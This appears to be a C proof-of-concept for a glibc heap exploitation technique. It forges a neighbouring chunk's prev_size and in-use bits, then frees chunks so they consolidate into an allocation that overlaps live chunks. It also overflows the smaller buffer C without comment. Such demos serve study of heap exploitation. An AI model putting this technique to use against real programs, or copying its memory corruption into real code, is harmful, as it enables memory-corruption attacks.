#include<malloc.h>
#include<string.h>
void main()
{
char *x,*fast,*A, *B, *C;
x = malloc(0x100 - 8);
memset(x,'x',0x100 - 8);
fast = malloc(1);
memset(fast,'f',3);
A = malloc(0x100 - 8);
memset(A,'a',0x100 - 8);
B = malloc(0x100 - 8);
memset(B,'b',0x100 - 8);
C = malloc(0x80 - 8);
memset(C,'c',0x100 - 8);
 
printf("x = %p\n", x);
printf("f = %p\n", fast);
printf("a = %p\n", A);
printf("b = %p\n", B);
printf("C length = %d\n", *(int *)(B - 4));
A[0xf7] = 0x00;
//change the pre_size of B (in A's own memory)
A[0xF8] = 0x10;
A[0xF9] = 0x02;
A[0xFA] = 0x00;
A[0xFB] = 0x00;
//A[0xFC] = 0x00;
A[0xFC] = 0x01;

 
printf("before trigger vul, A: %s\n", A);
printf("before trigger vul, fast: %s\n", fast);
 
free(x);//aovid the safe unlinking when merge from x->B
free(B);//merge from x to B . Then overlap fast and A
char *new = malloc(0x100 + 8);
printf("%p\n", new);
memset(new,'w',0x100 + 8);
printf("after trigger vul, A: %s\n", A);
printf("after trigger vul, fast: %s\n", fast);
}
